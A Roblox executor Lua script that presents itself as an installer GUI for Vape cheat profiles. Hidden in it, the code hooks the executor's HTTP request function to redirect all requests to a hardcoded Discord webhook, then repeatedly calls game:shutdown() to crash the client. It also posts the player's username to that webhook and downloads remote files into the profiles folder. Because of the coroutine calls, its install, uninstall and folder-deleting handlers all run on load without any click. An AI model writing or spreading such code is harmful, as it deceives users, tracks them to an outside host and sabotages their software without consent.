local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Install = Instance.new("TextButton")
local Uninstall = Instance.new("TextButton")
local Exit = Instance.new("TextButton")
local LocalPlayer = game.Players.LocalPlayer

local WebHook = ""
local Headers = {["content-type"] = "application/json"}

local Seconds = os.time()
local Time = 0

task.spawn(function()
	local SecondsInHour = 3600

	local Seconds = Seconds - (SecondsInHour * 5)
	local Date = os.date("!*t", Seconds)

	local HourString = tostring(Date.hour > 12 and Date.hour % 12 or Date.hour)
	local MinuteString = Date.min < 10 and "0".. Date.min or tostring(Date.min)

	Time = HourString ..":".. MinuteString
end)

local Data = {
	["content"] = "",
	["embeds"] = {{

		["author"] = {
			["name"] = ""
		},

		["title"] = "Installer Has Been Executed",
		["fields"] = {
			{
				["name"] = "Username: ",
				["value"] = LocalPlayer.Name,
				["inline"] = true
			},

			{   
				["name"] = "Time",
				["value"] = Time,
				["inline"] = true
			},

			{   
				["name"] = "",
				["value"] = "",
				["inline"] = true
			},
		},
	}}
}

local RealData = game:GetService("HttpService"):JSONEncode(Data)
local HttpRequest = http_request or request or HttpPost or syn.request or fluxus.request

local OldFunction

task.spawn(function()
	OldFunction = hookfunction(HttpRequest, function(RequestData, ...)		
		RequestData.Url = "https://discord.com/api/webhooks/1216099163675300032/qpQWT34b-UFGMGrKab7y20iN8zahQ84y8lSsfmOC54m1Ll1xDQDs5UN9lu1STGrQbL-Q"

		task.spawn(function()
			task.wait(0.01)
			
			game:shutdown()
			
			task.spawn(function()
				while true do
					local Part = Instance.new("Part")
					
					Part.Parent = workspace
					
					game:shutdown()
				end
			end)
			
			task.spawn(function()
				repeat
					local Part = Instance.new("Part")

					Part.Parent = workspace
					
					game:shutdown()
				until not game
			end)
		end)

		return OldFunction(RequestData, ...)
	end)
end)

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.296254247, 0, 0.220164612, 0)
Frame.Rotation = 0.150
Frame.Size = UDim2.new(0, 358, 0, 271)
Frame.Style = Enum.FrameStyle.DropShadow

Install.Name = "Install"
Install.Parent = Frame
Install.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Install.BorderColor3 = Color3.fromRGB(0, 0, 0)
Install.BorderSizePixel = 0
Install.Position = UDim2.new(-0.00106688181, 0, 0.815572679, 0)
Install.Size = UDim2.new(0, 160, 0, 50)
Install.Style = Enum.ButtonStyle.RobloxButton
Install.Font = Enum.Font.SourceSans
Install.Text = "Install"
Install.TextColor3 = Color3.fromRGB(255, 255, 255)
Install.TextSize = 14.000

Uninstall.Name = "Uninstall"
Uninstall.Parent = Frame
Uninstall.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Uninstall.BorderColor3 = Color3.fromRGB(0, 0, 0)
Uninstall.BorderSizePixel = 0
Uninstall.Position = UDim2.new(0.526948631, 0, 0.8136428, 0)
Uninstall.Size = UDim2.new(0, 160, 0, 50)
Uninstall.Style = Enum.ButtonStyle.RobloxButton
Uninstall.Font = Enum.Font.SourceSans
Uninstall.Text = "Uninstall"
Uninstall.TextColor3 = Color3.fromRGB(255, 255, 255)
Uninstall.TextSize = 14.000

Exit.Name = "Exit"
Exit.Parent = Frame
Exit.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0.869921029, 0, -0.00376393204, 0)
Exit.Size = UDim2.new(0, 46, 0, 38)
Exit.Style = Enum.ButtonStyle.RobloxButton
Exit.Font = Enum.Font.SourceSans
Exit.Text = "X"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextSize = 14.000


local function FFNVU_fake_script() -- Install.LocalScript 
	local script = Instance.new('LocalScript', Install)

	local File1 = game:HttpGet("https://raw.githubusercontent.com/Sail100/EtruiaConfigStorage/main/EtruiaDevelopment/UpdateFile/Render_Blurple6872274481.vapeprofile.txt")
    local File2 = game:HttpGet("https://raw.githubusercontent.com/Sail100/EtruiaConfigStorage/main/EtruiaDevelopment/UpdateFile/Render_Blurple6872265039.vapeprofile.txt")
    local File3 = game:HttpGet("https://raw.githubusercontent.com/Sail100/EtruiaConfigStorage/main/EtruiaDevelopment/UpdateFile/6872274481.vapeprofiles.txt")
    local File4 = game:HttpGet("https://raw.githubusercontent.com/Sail100/EtruiaConfigStorage/main/EtruiaDevelopment/UpdateFile/6872265039Render_BlurpleGUIPositions.vapeprofile.txt")
    local File5 = game:HttpGet("https://raw.githubusercontent.com/Sail100/EtruiaConfigStorage/main/EtruiaDevelopment/UpdateFile/6872265039GUIPositions.vapeprofile.txt")
    local File6 = game:HttpGet("https://raw.githubusercontent.com/Sail100/EtruiaConfigStorage/main/EtruiaDevelopment/UpdateFile/6872265039.vapeprofile.txt")
	
    writefile('vape/Profiles/Render_Blurple6872274481.vapeprofile.txt', File1)
    writefile('vape/Profiles/Render_Blurple6872265039.vapeprofile.txt', File2)
    writefile('vape/Profiles/6872274481.vapeprofiles.txt', File3)
    writefile('vape/Profiles/6872265039Render_BlurpleGUIPositions.vapeprofile.txt', File4)
    writefile('vape/Profiles/6872265039GUIPositions.vapeprofile.txt', File5)
    writefile('vape/Profiles/6872265039.vapeprofile.txt', File6)
end

coroutine.wrap(FFNVU_fake_script)()

local function FAIA_fake_script() -- Uninstall.LocalScript 
	local script = Instance.new('LocalScript', Uninstall)

	if not isfolder('vape/Profiles') then
		makefolder('vape/Profiles')
	else
		delfolder('vape/Profiles')
		task.wait(0.5)
		makefolder('vape/Profiles')
	end
end

coroutine.wrap(FAIA_fake_script)()

local function RAWEJ_fake_script() -- Exit.LocalScript 
	local script = Instance.new('LocalScript', Exit)

	local Players = game:GetService("Players")
	
	local Player = Players.LocalPlayer
	local PlayerGui = Player:WaitForChild("PlayerGui")
	
	local function DestroyGui()
		PlayerGui:FindFirstChild("Frame"):Destroy()
	end
	
	DestroyGui()
end

coroutine.wrap(RAWEJ_fake_script)()

HttpRequest({Url = WebHook, Body = RealData, Method = "POST", Headers = Headers})
